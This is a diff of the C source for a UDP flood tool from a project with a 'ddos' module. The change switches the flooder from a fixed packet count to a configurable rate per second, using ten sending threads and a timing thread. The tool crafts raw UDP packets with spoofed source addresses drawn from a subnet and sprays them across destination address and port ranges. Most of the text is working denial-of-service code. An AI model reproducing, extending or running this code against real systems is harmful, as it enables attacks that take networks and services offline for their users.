@@ -1,14 +1,14 @@
 #include "../header.h"
 #include "../base/make_ipv4.h"
 #include "../base/subnet_mask.h"
+#include "../base/time_check.h"
 #include "../ddos/udp_flood.h"
 
-#define REQUEST_PER_THREAD 1000
 #define DATA "Hello, This is Data!"
 
 // session counting
 unsigned long g_udp_total;
-unsigned long g_udp_produced;
+unsigned long g_udp_produced_in_sec;
 // from main()
 char g_udp_src_ip[16] = { 0, };
 char g_udp_dest_ip[16] = { 0, };
@@ -16,17 +16,21 @@ int g_udp_src_mask;
 int g_udp_dest_mask;
 int g_udp_dest_port_start;
 int g_udp_dest_port;
+int g_udp_request_per_sec;
 // for masking next ip address
 char g_udp_now_src_ip[16] = { 0, };
 char g_udp_now_dest_ip[16] = { 0, };
 int g_udp_now_port = 0;
-
+// thread
 pthread_mutex_t g_udp_mutex = PTHREAD_MUTEX_INITIALIZER;
 pthread_cond_t g_udp_cond;
+// time checking
+struct timespec g_udp_before_time;
+struct timespec g_udp_now_time;
 
 void udp_flood_print_usage(void)
 {
-	printf("UDP flood Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests, Default: 1 Loop] \n");
+	printf("UDP flood Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec] \n");
 }
 
 void *generate_udp_request(void *data)
@@ -61,22 +65,32 @@ void *generate_udp_request(void *data)
 		udp_h_ptr->dest_port = htons(g_udp_now_port);
 		strcpy(udp_h_ptr -> data, DATA);
 		udp_h_ptr->len = htons(strlen(DATA));
-		// thread terminate
-		if (g_udp_produced >= g_udp_total) {
-			pthread_mutex_unlock(&g_udp_mutex);
-			pthread_cond_broadcast(&g_udp_cond);
-			return 0;
+		if (g_udp_produced_in_sec >= g_udp_request_per_sec) {
+			pthread_cond_wait(&g_udp_cond, &g_udp_mutex);
 		}
+		// time checking
+		time_check(&g_udp_mutex, &g_udp_cond, &g_udp_before_time, &g_udp_now_time, &g_udp_produced_in_sec);
 		// make and send packet
 		char *packet = packet_assemble(ipv4_h, udp_h_ptr, sizeof(struct udphdr));
 		send_packet(sock, ipv4_h, packet, g_udp_now_port);
 		free(packet);
-		g_udp_produced++;
+		g_udp_produced_in_sec++;
+		g_udp_total++;
 		// *** end of critical section ***
 		pthread_mutex_unlock(&g_udp_mutex);
 	}
 	close(sock);
 	return 0;
+}
+
+void *udp_time_check(void *data)
+{
+	while (1) {
+		pthread_mutex_lock(&g_udp_mutex);
+		time_check(&g_udp_mutex, &g_udp_cond, &g_udp_before_time, &g_udp_now_time, &g_udp_produced_in_sec);
+		pthread_mutex_unlock(&g_udp_mutex);
+	}
+	return NULL;
 }
 
 void udp_flood_run(char *argv[])
@@ -85,7 +99,7 @@ void udp_flood_run(char *argv[])
 	while (argv[argc] != NULL) {
 		argc++;
 	}
-	if (argc != 3 && argc != 4) {
+	if (argc != 4) {
 		udp_flood_print_usage();
 		return;
 	}
@@ -97,28 +111,23 @@ void udp_flood_run(char *argv[])
 										&g_udp_dest_mask,
 										&g_udp_dest_port_start,
 										&g_udp_dest_port);
-	g_udp_produced = 0;
-	// calculate g_udp_total
-	if (argc == 4) {
-		g_udp_total = atoi(argv[3]);
-	}
-	else {
-		g_udp_total = (unsigned long)pow(2, 32-g_udp_src_mask) *
-									(unsigned long)pow(2, 32-g_udp_dest_mask) *
-									(g_udp_dest_port - g_udp_dest_port_start + 1);
-	}
-	int num_threads = g_udp_total / REQUEST_PER_THREAD;
+	g_udp_produced_in_sec = 0;
+	g_udp_total = 0;
+	g_udp_request_per_sec = atoi(argv[3]);
+	int num_threads = 10;
 	pthread_t threads[9999];
 	printf("Sending UDP requests to %s using %d threads\n",argv[1], num_threads);
-	for (int i = 0; i < num_threads; i++) {
+	int i;
+	for (i = 0; i < num_threads; i++) {
 		pthread_create(&threads[i], NULL, generate_udp_request, NULL);
 	}
+	pthread_create(&threads[i], NULL, udp_time_check, NULL);
 	for (int i = 0; i < num_threads; i++) {
 		pthread_join(threads[i], NULL);
 		printf("thread %d joined\n", i);
 	}
 	pthread_mutex_destroy(&g_udp_mutex);
 	pthread_exit(NULL);
-	printf("UDP flood finished\nTotal %lu packets sent.\n", g_udp_produced);
+	printf("UDP flood finished\nTotal %lu packets sent.\n", g_udp_produced_in_sec);
 	return;
 }
